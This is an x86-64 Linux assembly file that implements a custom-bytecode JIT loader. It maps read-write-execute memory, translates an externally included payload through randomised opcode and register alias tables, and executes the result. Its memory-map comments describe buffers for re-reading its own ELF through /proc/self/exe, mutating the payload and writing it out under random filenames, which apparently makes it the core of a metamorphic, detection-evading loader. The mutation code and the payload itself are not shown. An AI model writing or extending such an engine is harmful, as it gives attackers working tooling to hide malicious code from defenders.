.intel_syntax noprefix
.globl _start

.section .text

# REGISTER ALIAS MAP
.quad 0xAABBCCDDEEFF9988
reg_alias_map:
.byte 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F

# ALIAS MAP
.byte 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88
alias_map:
alias_mov_reg_imm:       .byte 0x10, 0x11, 0x12
alias_mov_reg_imm64:     .byte 0x13, 0x14, 0x15
alias_syscall:           .byte 0x16, 0x17, 0x18
alias_unused:            .byte 0x19, 0x1A, 0x1B
alias_alu_reg_imm:       .byte 0x1C, 0x1D, 0x1E
alias_jne_rel8:          .byte 0x1F, 0x20, 0x21
alias_lea_rsi_rel:       .byte 0x22, 0x23, 0x24
alias_push_imm32:        .byte 0x25, 0x26, 0x27
alias_lea_rdi_rel:       .byte 0x28, 0x29, 0x2A
alias_data_8:            .byte 0x2B, 0x2C, 0x2D
alias_mov_reg_reg:       .byte 0x2E, 0x2F, 0x30
alias_mov_mem_reg:       .byte 0x31, 0x32, 0x33
alias_mov_reg_mem:       .byte 0x34, 0x35, 0x36
alias_mov_reg_imm8:      .byte 0x37, 0x38, 0x39
alias_inc_reg:           .byte 0x3A, 0x3B, 0x3C
alias_dec_reg:           .byte 0x3D, 0x3E, 0x3F
alias_cmp_reg_imm8:      .byte 0x40, 0x41, 0x42
alias_cmp_reg_reg:       .byte 0x43, 0x44, 0x45
alias_jmp_rel8:          .byte 0x46, 0x47, 0x48
alias_je_rel8:           .byte 0x49, 0x4A, 0x4B
alias_jl_rel8:           .byte 0x4C, 0x4D, 0x4E
alias_jge_rel8:          .byte 0x4F, 0x50, 0x51
alias_jnc_rel8:          .byte 0x52, 0x53, 0x54
alias_push_reg:          .byte 0x55, 0x56, 0x57
alias_pop_reg:           .byte 0x58, 0x59, 0x5A
alias_xor_reg_reg:       .byte 0x5B, 0x5C, 0x5D
alias_rdrand_reg:        .byte 0x5E, 0x5F, 0x60
alias_div_reg:           .byte 0x61, 0x62, 0x63
alias_imul_reg_imm8:     .byte 0x64, 0x65, 0x66
alias_and_reg_imm8:      .byte 0x67, 0x68, 0x69
alias_add_reg_imm8:      .byte 0x6A, 0x6B, 0x6C
alias_sub_reg_reg:       .byte 0x6D, 0x6E, 0x6F
alias_add_reg_reg:       .byte 0x70, 0x71, 0x72
alias_mov_byte_mem_reg:  .byte 0x73, 0x74, 0x75
alias_mov_reg_byte_mem:  .byte 0x76, 0x77, 0x78
alias_lea_reg_rip_rel:   .byte 0x79, 0x7A, 0x7B
alias_jnop:              .byte 0x7C, 0x7D, 0x7E
alias_add_reg_imm32:     .byte 0x7F, 0x80, 0x81
alias_map_end:
.byte 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11

# THE PAYLOAD (Custom Bytecode)
.byte 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0x13, 0x37
custom_payload:

.include "src_trans/payload.inc"
custom_payload_end:                          # <-- explicitly mark the end
.byte 0xFE, 0xEB, 0xDA, 0xED, 0x73, 0x31, 0x73, 0x31

proc_self_exe:
    .asciz "/proc/self/exe"

# INITIALIZE TRANSLATION TABLE 
init_table:
    # Clear 2048 bytes (256 * 8) first
    mov rcx, 256
    xor eax, eax
    mov rbx, rdi
ClearTableLoop:
    mov qword ptr [rbx], rax
    add rbx, 8
    dec rcx
    jnz ClearTableLoop

    lea rsi, [rip + alias_map]

.macro INIT_OP alias_start, packed_val
    mov rax, \packed_val
    movzx rdx, byte ptr [rsi + (\alias_start - 0x10)]
    mov qword ptr [rdi + rdx*8], rax
    movzx rdx, byte ptr [rsi + (\alias_start - 0x10) + 1]
    mov qword ptr [rdi + rdx*8], rax
    movzx rdx, byte ptr [rsi + (\alias_start - 0x10) + 2]
    mov qword ptr [rdi + rdx*8], rax
.endm

    # Type | ModBase | OpExt | BaseREX | b2 | b1 | op_len | opc_len
    # Raw Copy:
    INIT_OP 0x13, 0x0400004800B80901 # MOV_REG_IMM64
    INIT_OP 0x16, 0x00000000050F0002 # SYSCALL
    INIT_OP 0x19, 0x0000000000900001 # UNUSED (Fallback to JNOP)
    INIT_OP 0x1F, 0x0000000000750101 # JNE_REL8
    INIT_OP 0x22, 0x000000358D480403 # LEA_RSI_REL
    INIT_OP 0x25, 0x0000000000680401 # PUSH_IMM32
    INIT_OP 0x28, 0x0000003D8D480403 # LEA_RDI_REL
    INIT_OP 0x2B, 0x0000000000000800 # DATA_8
    INIT_OP 0x46, 0x0000000000EB0101 # JMP_REL8
    INIT_OP 0x49, 0x0000000000740101 # JE_REL8
    INIT_OP 0x4C, 0x00000000007C0101 # JL_REL8
    INIT_OP 0x4F, 0x00000000007D0101 # JGE_REL8
    INIT_OP 0x52, 0x0000000000730101 # JNC_REL8
    INIT_OP 0x7C, 0x0000000000900001 # JNOP

    # Type 8: REG_IMM32
    INIT_OP 0x10, 0x08C0004800C70501 # MOV_REG_IMM
    INIT_OP 0x1C, 0x08C0004800810501 # ALU_REG_IMM
    INIT_OP 0x7F, 0x08C0004800810501 # ADD_REG_IMM32

    # Type 1: RM_REG
    INIT_OP 0x2E, 0x01C0004800890201 # MOV_REG_REG
    INIT_OP 0x31, 0x0100004800890201 # MOV_MEM_REG
    INIT_OP 0x5B, 0x01C0004800310201 # XOR_REG_REG
    INIT_OP 0x6D, 0x01C0004800290201 # SUB_REG_REG
    INIT_OP 0x70, 0x01C0004800010201 # ADD_REG_REG
    INIT_OP 0x73, 0x0100004000880201 # MOV_BYTE_MEM_REG (8-bit)

    # Type 2: REG_RM
    INIT_OP 0x34, 0x02000048008B0201 # MOV_REG_MEM
    INIT_OP 0x43, 0x02C00048003B0201 # CMP_REG_REG
    INIT_OP 0x76, 0x02000048B60F0202 # MOV_REG_BYTE_MEM (8-bit)

    # Type 3: REG_ONLY_MODRM
    INIT_OP 0x3A, 0x03C0004800FF0101 # INC_REG
    INIT_OP 0x3D, 0x03C0014800FF0101 # DEC_REG
    INIT_OP 0x5E, 0x03C00648C70F0102 # RDRAND_REG
    INIT_OP 0x61, 0x03C0064800F70101 # DIV_REG

    # Type 4: REG_ONLY_OPCODE
    INIT_OP 0x55, 0x0400000000500001 # PUSH_REG
    INIT_OP 0x58, 0x0400000000580001 # POP_REG

    # Type 5: REG_IMM8
    INIT_OP 0x37, 0x05C0004800C70201 # MOV_REG_IMM8
    INIT_OP 0x40, 0x05C0074800830201 # CMP_REG_IMM8
    INIT_OP 0x67, 0x05C0044800830201 # AND_REG_IMM8
    INIT_OP 0x6A, 0x05C0004800830201 # ADD_REG_IMM8

    # Type 6: REG_IMM8_DUAL
    INIT_OP 0x64, 0x06C00048006B0201 # IMUL_REG_IMM8

    # Type 7: REG_RIP_REL
    INIT_OP 0x79, 0x07050048008D0501 # LEA_REG_RIP_REL
    
    ret

_start:
    # Memory Map (r14 = base):
    #   +0x0000 (0):     Translation table     - 2048 bytes (256 * 8)
    #   +0x0800 (2048):  [padding]
    #   +0x1000 (4096):  JIT code buffer       - 8192 bytes max
    #   +0x3000 (12288): ELF read buffer       - 32768 bytes max
    #   +0xB000 (45056): Mutated payload buf   - 8192 bytes max
    #   +0xD000 (53248): New alias bytes buf   - 256 bytes
    #   +0xD100 (53504): Random filename buf   - 32 bytes
    #   +0xD200 (53760): Payload scratch vars  - 64 bytes
    #     +0x00: elf_size      (8 bytes, saved after sys_read)
    #     +0x08: payload_start (8 bytes, saved after FOUND_PAYLOAD_START)

    # Allocate Executable/Writable Memory (mmap)
    mov rax, 9          # sys_mmap
    xor rdi, rdi        # addr = NULL
    mov rsi, 65536      # length = 64KB (Table, JIT, Builder Buf, ELF Buf)
    mov rdx, 7          # prot = PROT_READ | PROT_WRITE | PROT_EXEC
    mov r10, 0x22       # flags = MAP_PRIVATE | MAP_ANONYMOUS
    mov r8, -1          # fd = -1
    xor r9, r9          # offset = 0
    syscall

    test rax, rax
    js Error
    mov r14, rax        # R14 = translation table base
    lea r15, [r14 + 4096] # R15 = JIT compiled code destination

    # Initialize translation table in our writable mapped memory
    mov rdi, r14
    call init_table

    # 2. JIT Translation Loop
    lea r12, [rip + custom_payload]  # Source
    lea r13, [rip + custom_payload_end]
    mov r8, r15                      # Save start of JIT buffer for calling later

TranslateLoop:
    cmp r12, r13
    jae TranslateDone

    movzx rax, byte ptr [r12]
    inc r12

    mov rbx, r14
    mov rdx, qword ptr [rbx + rax * 8]

    mov rcx, rdx
    shr rcx, 56
    cmp rcx, 0
    je .format_0
    cmp rcx, 1
    je .format_1
    cmp rcx, 2
    je .format_2
    cmp rcx, 3
    je .format_3
    cmp rcx, 4
    je .format_4
    cmp rcx, 5
    je .format_5
    cmp rcx, 6
    je .format_6
    cmp rcx, 7
    je .format_7
    cmp rcx, 8
    je .format_8
    jmp TranslateDone

.format_0:
    movzx rcx, dl
    mov al, dh
    test rcx, rcx
    jz .f0_copy_ops_prep

    push rdx
    shr rdx, 16
.f0_op_write:
    mov byte ptr [r15], dl
    inc r15
    shr rdx, 8
    dec rcx
    jnz .f0_op_write
    pop rdx

.f0_copy_ops_prep:
    mov cl, al
    test cl, cl
    jz TranslateLoop

.f0_copy_ops:
    mov al, byte ptr [r12]
    mov byte ptr [r15], al
    inc r12
    inc r15
    dec cl
    jnz .f0_copy_ops
    jmp TranslateLoop

.format_1:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
    movzx r9, byte ptr [r12+1]
    movzx r9, byte ptr [r10 + r9]
    add r12, 2
    call .write_rex_and_op
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    and r9, 7
    shl r9, 3
    or rax, r9
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    jmp TranslateLoop

.format_2:
    movzx r9, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r9, byte ptr [r10 + r9]
    movzx r8, byte ptr [r12+1]
    movzx r8, byte ptr [r10 + r8]
    add r12, 2
    call .write_rex_and_op
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    and r9, 7
    shl r9, 3
    or rax, r9
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    jmp TranslateLoop

.format_3:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
    xor r9, r9
    add r12, 1
    call .write_rex_and_op
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    mov r11, rdx
    shr r11, 40
    and r11, 0xFF
    shl r11, 3
    or rax, r11
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    jmp TranslateLoop

.format_4:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
    xor r9, r9
    add r12, 1
    mov r11, r8
    and r11, 7
    shl r11, 16
    add rdx, r11
    call .write_rex_and_op
    mov rcx, rdx
    shr rcx, 8
    and rcx, 0xFF
    test rcx, rcx
    jz TranslateLoop
    dec rcx                     # subtract the reg byte already consumed by this handler
    test rcx, rcx
    jz TranslateLoop
.fmt4_copy_ops:
    mov al, byte ptr [r12]
    mov byte ptr [r15], al
    inc r12
    inc r15
    dec rcx
    jnz .fmt4_copy_ops
    jmp TranslateLoop

.format_5:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
    xor r9, r9
    add r12, 1
    call .write_rex_and_op
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    mov r11, rdx
    shr r11, 40
    and r11, 0xFF
    shl r11, 3
    or rax, r11
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    mov al, byte ptr [r12]
    mov byte ptr [r15], al
    inc r12
    inc r15
    # Check if opcode is 0xC7 (MOV_REG_IMM8) to pad remaining 3 bytes of imm32
    mov rax, rdx
    shr rax, 16
    and rax, 0xFF
    cmp al, 0xC7
    jne .f5_done
    mov byte ptr [r15], 0
    mov byte ptr [r15+1], 0
    mov byte ptr [r15+2], 0
    add r15, 3
.f5_done:
    jmp TranslateLoop

.format_6:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
    mov r9, r8
    add r12, 1
    call .write_rex_and_op
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    mov r11, r8
    and r11, 7
    shl r11, 3
    or rax, r11
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    mov al, byte ptr [r12]
    mov byte ptr [r15], al
    inc r12
    inc r15
    jmp TranslateLoop

.format_7:
    movzx r9, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r9, byte ptr [r10 + r9]
    xor r8, r8
    add r12, 1
    call .write_rex_and_op
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    and r9, 7
    shl r9, 3
    or rax, r9
    mov byte ptr [r15], al
    inc r15
    mov eax, dword ptr [r12]
    mov dword ptr [r15], eax
    add r12, 4
    add r15, 4
    jmp TranslateLoop

.format_8:
    movzx r8, byte ptr [r12]
    lea r10, [rip + reg_alias_map]
    movzx r8, byte ptr [r10 + r8]
    xor r9, r9
    add r12, 1
    call .write_rex_and_op
    mov rax, rdx
    shr rax, 48
    and rax, 0xFF
    mov r11, rdx
    shr r11, 40
    and r11, 0xFF
    shl r11, 3
    or rax, r11
    and r8, 7
    or rax, r8
    mov byte ptr [r15], al
    inc r15
    mov eax, dword ptr [r12]
    mov dword ptr [r15], eax
    add r12, 4
    add r15, 4
    jmp TranslateLoop

.write_rex_and_op:
    mov rax, rdx
    shr rax, 32
    and rax, 0xFF
    cmp r8, 8
    jl .wrex_chk2
    test rax, rax
    jnz .has_rex1
    mov rax, 0x40
.has_rex1:
    or rax, 0x01
.wrex_chk2:
    cmp r9, 8
    jl .wrex_out
    test rax, rax
    jnz .has_rex2
    mov rax, 0x40
.has_rex2:
    or rax, 0x04
.wrex_out:
    test rax, rax
    jz .wop_loop_prep
    mov byte ptr [r15], al
    inc r15
.wop_loop_prep:
    movzx rcx, dl
    test rcx, rcx
    jz .wop_done
    push rdx
    shr rdx, 16
.wop_loop:
    mov byte ptr [r15], dl
    inc r15
    shr rdx, 8
    dec rcx
    jnz .wop_loop
    pop rdx
.wop_done:
    ret

TranslateDone:
    lea rax, [r14 + 4096]
    call rax           # execute JIT-compiled payload
    mov rax, 60
    xor rdi, rdi
    syscall

TranslateError:
Error:
    mov rax, 60
    mov rdi, 1
    syscall
